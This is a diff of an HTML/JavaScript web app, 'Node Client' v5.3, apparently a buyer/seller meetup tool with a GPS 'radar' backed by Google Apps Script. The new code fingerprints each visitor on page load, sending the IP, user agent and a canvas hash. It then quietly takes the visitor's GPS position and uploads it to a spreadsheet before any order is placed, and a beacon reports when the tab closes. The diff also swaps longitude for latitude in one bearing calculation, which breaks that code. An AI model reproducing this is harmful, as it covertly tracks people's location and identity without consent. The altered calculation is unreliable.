@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Client v5.2 (Anti-Duplication Lock)</title>
+    <title>Node Client v5.3 (State Machine Core)</title>
     <style>
         body { margin: 0; padding: 0; background: #030303; background-image: radial-gradient(circle at 50% 50%, #0a0a0a 0%, #000000 100%); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #dcdcdc; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
         
@@ -25,6 +25,7 @@
         .content::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
 
         #env-check-board { display: none; background: rgba(255, 0, 0, 0.1); border: 1px dashed #ff4444; padding: 15px; border-radius: 8px; margin-bottom: 15px; font-size: 13px; color: #ff6666; line-height: 1.5; }
+        #connection-status-board { background: rgba(0, 153, 255, 0.1); border: 1px dashed rgba(0, 153, 255, 0.4); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; font-size: 13px; color: #66b3ff; text-align: center; font-weight: bold; }
         
         #gas-config-container { display: none; background: rgba(0, 255, 136, 0.05); border: 1px dashed rgba(0, 255, 136, 0.3); padding: 15px; border-radius: 8px; margin-bottom: 15px; }
         #gas-config-container label { color: #00ff88; font-size: 11px; margin-bottom: 8px; display: block; }
@@ -95,19 +96,10 @@
         .override-group label { color: #ffaa00; }
         .override-group input:focus { border-color: rgba(255, 170, 0, 0.4); box-shadow: 0 0 10px rgba(255, 170, 0, 0.1); }
         
-        /* v5.0 LINE 防護牆專用 UI */
-        #line-escape-wall {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #0f0f0f; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; box-sizing: border-box; text-align: center;
-        }
+        #line-escape-wall { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f0f0f; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; box-sizing: border-box; text-align: center; }
         #line-escape-wall h2 { color: #ffaa00; margin-bottom: 10px; font-size: 24px; }
         #line-escape-wall p { color: #ccc; line-height: 1.6; margin-bottom: 30px; font-size: 15px; }
-        .btn-escape {
-            background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%); color: #000; 
-            padding: 16px 30px; border-radius: 30px; font-size: 18px; font-weight: bold; 
-            text-decoration: none; box-shadow: 0 10px 20px rgba(0,255,136,0.3);
-            transition: transform 0.2s;
-        }
+        .btn-escape { background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%); color: #000; padding: 16px 30px; border-radius: 30px; font-size: 18px; font-weight: bold; text-decoration: none; box-shadow: 0 10px 20px rgba(0,255,136,0.3); transition: transform 0.2s; }
         .btn-escape:active { transform: scale(0.95); }
     </style>
 </head>
@@ -121,7 +113,7 @@
 
 <div id="glass-window">
     <div id="window-header">
-        <span id="window-title">Node Client v5.2 (Anti-Duplication)</span>
+        <span id="window-title">Node Client v5.3 (State Machine Core)</span>
         <span id="settings-btn" title="系統配置">⚙</span>
     </div>
     
@@ -160,12 +152,13 @@
 
     <div class="content">
         <div id="env-check-board"></div>
+        <div id="connection-status-board">連線初始化中... 請稍候</div>
 
         <div id="gas-config-container">
             <label>API [POST] Route</label>
-            <input type="text" id="config_gas_post_url" value="https://script.google.com/macros/s/AKfycbyAvgCZ3aa4uV03fhFq_Mb1r4L-dC_TS0uYde-y_bfKgI8_hMSAm3Jl6v6-VupsPWoXCA/exec">
+            <input type="text" id="config_gas_post_url" value="https://script.google.com/macros/s/AKfycbycpmORwTAExMb5tCrOaOHzbJLlvBnrEXKIVrfxfB7TajKU1ERqxuZv4Fb8ZGyvRQND8g/exec">
             <label>API [GET] Route</label>
-            <input type="text" id="config_gas_get_url" value="https://script.google.com/macros/s/AKfycbyAvgCZ3aa4uV03fhFq_Mb1r4L-dC_TS0uYde-y_bfKgI8_hMSAm3Jl6v6-VupsPWoXCA/exec">
+            <input type="text" id="config_gas_get_url" value="https://script.google.com/macros/s/AKfycbycpmORwTAExMb5tCrOaOHzbJLlvBnrEXKIVrfxfB7TajKU1ERqxuZv4Fb8ZGyvRQND8g/exec">
         </div>
 
         <div id="view-buyer">
@@ -196,7 +189,7 @@
                 <textarea id="order-memo" autocomplete="off" placeholder="Logs..."></textarea>
             </div>
 
-            <button class="btn-action" id="submit-btn">執行封裝與廣播</button>
+            <button class="btn-action" id="submit-btn" disabled>等待通道建立...</button>
         </div>
 
         <div id="view-seller" style="display: none;">
@@ -240,27 +233,13 @@
         const div = document.createElement('div'); div.className = `log-entry log-${type}`; div.innerHTML = `<span class="log-time">[${timeStr}]</span>${msg}`;
         sysLogContainer.prepend(div); console.log(`[${type.toUpperCase()}] ${msg}`);
     }
-    sysLog("System v5.2 Ready. Anti-Duplication Lock Active.", "success");
-
-    // [核心防禦] 靜默提權引擎 (Silent GPS Init)
-    let preCachedLat = null, preCachedLng = null, preCachedAcc = null;
-    if (navigator.geolocation && window.location.protocol === 'https:') {
-        sysLog("Initiating Background Silent GPS Request...", "info");
-        navigator.geolocation.getCurrentPosition(
-            (pos) => { 
-                preCachedLat = pos.coords.latitude; preCachedLng = pos.coords.longitude; preCachedAcc = pos.coords.accuracy;
-                sysLog(`Silent GPS Lock Acquired: [${preCachedLat.toFixed(4)}, ${preCachedLng.toFixed(4)}]`, "success"); 
-            },
-            (err) => { sysLog(`Silent GPS Init Blocked/Failed: Code ${err.code}`, "warn"); },
-            { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
-        );
-    }
+    sysLog("System v5.3 Ready. Pre-Init State Machine Active.", "success");
 
     const envBoard = document.getElementById('env-check-board');
     if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost' && window.location.protocol !== 'file:') {
         envBoard.style.display = 'block';
-        envBoard.innerHTML += `⚠️ <b>環境缺失</b>: 非 HTTPS 安全網域 (iOS 系統將強制封殺硬體 GPS)。請確保您是使用 GitHub Pages 網址開啟。`;
-        sysLog("HTTP detected. Hardware GPS locked. Override required.", "error");
+        envBoard.innerHTML += `⚠️ <b>環境缺失</b>: 非 HTTPS 安全網域 (iOS 系統將強制封殺硬體 GPS)。請確保您是使用 HTTPS 網址開啟。`;
+        sysLog("HTTP detected. Hardware GPS locked.", "error");
     }
     
     window.onerror = function(msg, url, line) { sysLog(`Crash: ${msg} (L${line})`, "error"); return true; };
@@ -301,7 +280,7 @@
         try {
             const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
             ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069'; ctx.fillText('Node v5.2', 2, 15);
+            ctx.fillStyle = '#069'; ctx.fillText('Node v5.3', 2, 15);
             const dataURL = canvas.toDataURL(); let hash = 0;
             for (let i = 0; i < dataURL.length; i++) { hash = ((hash << 5) - hash) + dataURL.charCodeAt(i); hash = hash & hash; }
             return 'CFP-' + Math.abs(hash).toString(16).toUpperCase();
@@ -358,6 +337,26 @@
     document.getElementById('btn-zoom-in').onclick = () => { if (currentZoomIndex > 0) { currentZoomIndex--; updateZoomDisplay(); } };
     document.getElementById('btn-zoom-out').onclick = () => { if (currentZoomIndex < zoomLevels.length - 1) { currentZoomIndex++; updateZoomDisplay(); } };
 
+    async function safeFetch(url, payload) {
+        try {
+            sysLog(`Fetching: ${payload.action || 'GET'}...`, "info");
+            const response = await fetch(url, { method: 'POST', redirect: 'follow', headers: { "Content-Type": "text/plain;charset=utf-8" }, body: JSON.stringify(payload) });
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
+            const data = await response.json(); return data;
+        } catch (error) { sysLog(`Fetch Failed: ${error.message}`, "error"); throw error; }
+    }
+
+    // 🌟 [v5.3 核心] 離線與關閉分頁監測器
+    function sendExitSignal() {
+        if (currentOrderId) {
+            const postUrl = document.getElementById('config_gas_post_url').value.trim();
+            const payload = JSON.stringify({ action: "exit_session", orderId: currentOrderId });
+            if (navigator.sendBeacon) { navigator.sendBeacon(postUrl, payload); } 
+            else { fetch(postUrl, { method: 'POST', body: payload, keepalive: true }).catch(e=>{}); }
+        }
+    }
+    window.addEventListener('beforeunload', sendExitSignal);
+
     function resetUI() {
         if(pollTimer) clearInterval(pollTimer); if(waitTimer) clearInterval(waitTimer); 
         if(radarTimer) clearInterval(radarTimer); if(arrivalTimer) clearInterval(arrivalTimer);
@@ -368,11 +367,12 @@
         lastDist = null; lastBear = null; currentZoomIndex = 3; updateZoomDisplay();
         sysOverrideLat = null; sysOverrideLng = null; sysLog("UI Reset Completed.", "info");
     }
+    
     document.getElementById('btn-exit-radar').onclick = () => {
-        resetUI();
-        // 釋放鎖定的按鈕
+        sendExitSignal(); resetUI();
         const btnS = document.getElementById('submit-btn'); btnS.disabled = false; btnS.innerText = "執行封裝與廣播";
         const btnB = document.getElementById('bind-seller-btn'); btnB.disabled = false; btnB.innerText = "綁定節點並啟動雷達";
+        document.getElementById('connection-status-board').innerText = "連線已安全關閉";
     };
 
     function formatTime(sec) { let m = Math.floor(sec/60); let s = sec%60; return m + ':' + (s<10?'0':'') + s; }
@@ -388,14 +388,40 @@
         targetDot.classList.add('active');
     }
 
-    async function safeFetch(url, payload) {
+    // 🌟 [v5.3 核心] 預載入狀態機引擎 (Pre-Init Session)
+    async function initSessionOnLoad() {
+        const postUrl = document.getElementById('config_gas_post_url').value.trim();
+        const statusBoard = document.getElementById('connection-status-board');
         try {
-            sysLog(`Fetching: ${payload.action || 'GET'}...`, "info");
-            const response = await fetch(url, { method: 'POST', redirect: 'follow', headers: { "Content-Type": "text/plain;charset=utf-8" }, body: JSON.stringify(payload) });
-            if (!response.ok) throw new Error(`HTTP ${response.status}`);
-            const data = await response.json(); return data;
-        } catch (error) { sysLog(`Fetch Failed: ${error.message}`, "error"); throw error; }
+            const dev = await getDevInfo();
+            const res = await safeFetch(postUrl, { action: "init_session", ip: dev.ip, vid: dev.vid, type: dev.type, os: dev.os, res: dev.res, ua: dev.ua, cfp: dev.cfp });
+            if (res.status === 'success' && res.row) {
+                currentOrderId = res.row;
+                statusBoard.innerText = `🟢 通道連線建立成功 (專屬 ID: ${currentOrderId})`;
+                statusBoard.style.color = "#00ff88"; statusBoard.style.borderColor = "rgba(0, 255, 136, 0.4)"; statusBoard.style.backgroundColor = "rgba(0, 255, 136, 0.05)";
+                
+                const submitBtn = document.getElementById('submit-btn');
+                submitBtn.disabled = false; submitBtn.innerText = "執行封裝與廣播";
+                
+                // 取得訂單 ID 後，啟動背景定位追蹤並自動寫入試算表
+                if (navigator.geolocation && window.location.protocol === 'https:') {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => { 
+                            sysLog("Background GPS Acquired. Syncing to Draft Row...", "success");
+                            safeFetch(postUrl, { action: "update_gps", role: "buyer", orderId: currentOrderId, lat: pos.coords.latitude, lng: pos.coords.longitude }).catch(e=>{});
+                        },
+                        (err) => { sysLog(`Background GPS Blocked/Failed: ${err.code}`, "warn"); },
+                        { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
+                    );
+                }
+            } else { throw new Error("Backend Row Allocation Failed"); }
+        } catch(e) {
+            statusBoard.innerText = `🔴 通道初始化失敗，請重新整理網頁`;
+            statusBoard.style.color = "#ff4444"; statusBoard.style.borderColor = "rgba(255, 68, 68, 0.4)"; statusBoard.style.backgroundColor = "rgba(255, 68, 68, 0.05)";
+        }
     }
+    // 網頁載入即觸發
+    window.addEventListener('load', initSessionOnLoad);
 
     function startRadarEngine(role, orderId) {
         const postUrl = document.getElementById('config_gas_post_url').value.trim();
@@ -421,12 +447,6 @@
             if (!navigator.geolocation) { radarStatus.innerText = "瀏覽器不支援定位功能，請使用手動覆寫！"; radarStatus.style.color = "#ff4444"; return; }
             radarStatus.innerText = "向系統請求即時定位中...";
             
-            // 立即使用靜默提權快取發送第一發座標
-            if (preCachedLat && preCachedLng) {
-                sysLog("Injecting Silent Pre-Cached GPS Data immediately.", "success");
-                sendGPS(preCachedLat, preCachedLng, preCachedAcc);
-            }
-
             const startWatch = (highAcc) => {
                 return navigator.geolocation.watchPosition(
                     (pos) => sendGPS(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
@@ -441,15 +461,10 @@
                     { enableHighAccuracy: highAcc, timeout: highAcc ? 8000 : 15000, maximumAge: highAcc ? 0 : 5000 }
                 );
             };
-            
-            if (!preCachedLat) {
-                navigator.geolocation.getCurrentPosition(
-                    () => { gpsWatchId = startWatch(true); },
-                    () => { gpsWatchId = startWatch(false); }, { enableHighAccuracy: false, timeout: 5000 }
-                );
-            } else {
-                gpsWatchId = startWatch(true);
-            }
+            navigator.geolocation.getCurrentPosition(
+                () => { gpsWatchId = startWatch(true); },
+                () => { gpsWatchId = startWatch(false); }, { enableHighAccuracy: false, timeout: 5000 }
+            );
         }
 
         let pollCount = 0;
@@ -464,7 +479,7 @@
                 if (targetLat && targetLng) {
                     if (sysOverrideLat !== null && sysOverrideLng !== null) {
                         lastDist = calcDist(sysOverrideLat, sysOverrideLng, parseFloat(targetLat), parseFloat(targetLng));
-                        lastBear = calcBear(sysOverrideLat, sysOverrideLng, parseFloat(targetLat), parseFloat(targetLng));
+                        lastBear = calcBear(sysOverrideLat, sysOverrideLat, parseFloat(targetLat), parseFloat(targetLng));
                         updateRadarVisuals(lastDist);
                     } else {
                         navigator.geolocation.getCurrentPosition((pos) => {
@@ -496,7 +511,7 @@
     }
 
     document.getElementById('submit-btn').onclick = async function() {
-        if (this.disabled) return; // 🌟 v5.2 核心：物理防呆鎖定
+        if (this.disabled || !currentOrderId) return;
         
         const postUrl = document.getElementById('config_gas_post_url').value.trim();
         const getUrl = document.getElementById('config_gas_get_url').value.trim();
@@ -507,46 +522,31 @@
         if (manualInput && !parsedGps) { alert("Google Map 座標格式錯誤！請貼上正確的網址或 緯度,經度"); return; }
         if (parsedGps) { sysOverrideLat = parsedGps.lat; sysOverrideLng = parsedGps.lng; }
 
-        this.disabled = true; // 鎖死按鈕
-        this.innerText = "🚀 封裝傳輸中...";
-
+        this.disabled = true; this.innerText = "🚀 封裝傳輸中...";
         resetUI(); overlay.style.display = 'flex';
         
         try {
-            const dev = await getDevInfo();
             const payload = { 
-                action: "submit_order", name: document.getElementById('order-name').value, contact: document.getElementById('order-contact').value, 
+                action: "submit_order", orderId: currentOrderId,
+                name: document.getElementById('order-name').value, contact: document.getElementById('order-contact').value, 
                 time: document.getElementById('order-meetuptime').value, loc: document.getElementById('order-location').value, 
                 itemA: document.getElementById('item-a').value, itemB: document.getElementById('item-b').value, 
-                memo: document.getElementById('order-memo').value.trim(), ip: dev.ip, vid: dev.vid, type: dev.type, os: dev.os, res: dev.res, ua: dev.ua, cfp: dev.cfp 
+                memo: document.getElementById('order-memo').value.trim()
             };
             
             const res = await safeFetch(postUrl, payload);
 
             if (res.status === 'success') {
-                currentOrderId = res.row;
-                
-                // ===== 🌟 [v5.1 核心修正] 訂單建立成功後，立刻把記憶體中的 GPS 上傳試算表！ =====
                 if (sysOverrideLat !== null && sysOverrideLng !== null) {
-                    safeFetch(postUrl, { action: "update_gps", role: "buyer", orderId: currentOrderId, lat: sysOverrideLat, lng: sysOverrideLng }).catch(e => console.log(e));
-                } else if (preCachedLat !== null && preCachedLng !== null) {
-                    sysLog("Force syncing pre-cached GPS to spreadsheet.", "success");
-                    safeFetch(postUrl, { action: "update_gps", role: "buyer", orderId: currentOrderId, lat: preCachedLat, lng: preCachedLng }).catch(e => console.log(e));
-                } else if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => safeFetch(postUrl, { action: "update_gps", role: "buyer", orderId: currentOrderId, lat: pos.coords.latitude, lng: pos.coords.longitude }).catch(e => console.log(e)),
-                        () => {}, { enableHighAccuracy: false, timeout: 5000 }
-                    );
+                    safeFetch(postUrl, { action: "update_gps", role: "buyer", orderId: currentOrderId, lat: sysOverrideLat, lng: sysOverrideLng }).catch(e=>{});
                 }
-                // ======================================================================
-
-                overlayText.innerHTML = `<div style="color: #aaa;">等待節點接收連線...</div><div class="highlight-time" id="wait-span">3600</div>`;
                 
+                overlayText.innerHTML = `<div style="color: #aaa;">等待節點接收連線...</div><div class="highlight-time" id="wait-span">3600</div>`;
                 let w = 3600; waitTimer = setInterval(() => { w--; if(w>0 && document.getElementById('wait-span')) document.getElementById('wait-span').innerText = w; }, 1000);
                 
                 pollTimer = setInterval(async () => {
                     try {
-                        const rr = await fetch(`${getUrl}?orderId=${res.row}&t=${Date.now()}`, { cache: 'no-store' });
+                        const rr = await fetch(`${getUrl}?orderId=${currentOrderId}&t=${Date.now()}`, { cache: 'no-store' });
                         const rres = await rr.json();
                         if (rres.status === 'accepted') {
                             clearInterval(pollTimer); clearInterval(waitTimer);
@@ -571,38 +571,42 @@
                                 ${timeDisplayHtml}
                                 <div style="font-size: 12px; color: #777; margin-top: 5px;">(對方備註)</div>
                             `;
-                            setTimeout(() => { startRadarEngine('buyer', res.row); }, 1500);
+                            setTimeout(() => { startRadarEngine('buyer', currentOrderId); }, 1500);
                         }
                     } catch(e){}
                 }, 3000);
             }
         } catch (e) { 
             sysLog("Critical Transmit Error.", "error"); resetUI(); 
-            this.disabled = false; this.innerText = "執行封裝與廣播"; // 失敗時解鎖
+            this.disabled = false; this.innerText = "執行封裝與廣播"; 
         }
     };
 
-    document.getElementById('bind-seller-btn').onclick = function() {
-        if (this.disabled) return; // 🌟 v5.2 核心：物理防呆鎖定
+    document.getElementById('bind-seller-btn').onclick = async function() {
+        if (this.disabled) return;
         
         const id = document.getElementById('seller-order-id').value.trim();
         if(!id || isNaN(id)) return alert("請輸入有效的訂單行號");
+        const postUrl = document.getElementById('config_gas_post_url').value.trim();
         
         const manualInput = document.getElementById('override-gps-seller').value;
         const parsedGps = parseManualGPS(manualInput);
         if (manualInput && !parsedGps) { alert("Google Map 座標格式錯誤！請貼上正確的網址或 緯度,經度"); return; }
         if (parsedGps) { sysOverrideLat = parsedGps.lat; sysOverrideLng = parsedGps.lng; }
 
-        this.disabled = true; // 鎖死按鈕
-        this.innerText = "📡 綁定啟動中...";
-
+        this.disabled = true; this.innerText = "📡 綁定啟動中...";
         currentOrderId = parseInt(id); resetUI(); overlay.style.display = 'flex';
         
-        spinner.style.display = 'none'; checkmark.style.display = 'block';
-        checkmark.style.animation = 'checkPop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards';
-        overlayText.innerHTML = `<div style="color: #00ff88; font-size: 20px;">賣方節點綁定成功</div><div style="color: #777; font-size: 14px; margin-top:10px;">訂單 ID: ${currentOrderId}</div>`;
-        
-        setTimeout(() => { startRadarEngine('seller', currentOrderId); }, 1000);
+        try {
+            await safeFetch(postUrl, { action: "bind_seller", orderId: currentOrderId });
+            spinner.style.display = 'none'; checkmark.style.display = 'block';
+            checkmark.style.animation = 'checkPop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards';
+            overlayText.innerHTML = `<div style="color: #00ff88; font-size: 20px;">賣方節點綁定成功</div><div style="color: #777; font-size: 14px; margin-top:10px;">訂單 ID: ${currentOrderId}</div>`;
+            setTimeout(() => { startRadarEngine('seller', currentOrderId); }, 1000);
+        } catch(e) {
+            sysLog("Bind Failed.", "error"); resetUI();
+            this.disabled = false; this.innerText = "綁定節點並啟動雷達";
+        }
     };
 </script>
 </body>
